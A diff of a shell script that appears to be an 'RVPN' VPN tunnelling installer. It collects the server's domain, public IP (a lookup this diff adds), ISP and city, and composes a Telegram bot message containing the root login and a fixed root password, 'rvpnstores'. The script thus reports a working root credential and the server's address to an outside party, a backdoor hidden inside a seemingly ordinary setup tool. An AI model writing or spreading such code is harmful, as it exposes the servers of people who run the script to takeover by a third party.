@@ -2,10 +2,11 @@
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
 #########################
-dom=$( cat /etc/xray/domain )
+DOMAIN=$( cat /etc/xray/domain )
 ISP=$(wget -qO- ipinfo.io/org)
 CITY=$(curl -s ipinfo.io/city)
 TIME=$(date +'%Y-%m-%d %H:%M:%S')
+MYIP=$(curl -sS ifconfig.me)
 ###
 clear
 red='\e[1;31m'
@@ -164,12 +165,10 @@ WKT="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="RVPN TUNNELING 
 ============================
-<code>Domain     :</code> <code>$dom</code>
+<code>Domain     :</code> <code>$DOMAIN</code>
 <code>IP Vps     :</code> <code>$MYIP</code>
 <code>User Login :</code> <code>root</code>
 <code>Pass Login :</code> <code>rvpnstores</code>
-<code>User Script:</code> <code>$Name</code>
-<code>Exp Script :</code> <code>$exp2 day</code>
 <code>Location   :</code> <code>$CITY</code>
 <code>Timezone   :</code> <code>$TIME</code>
 ============================
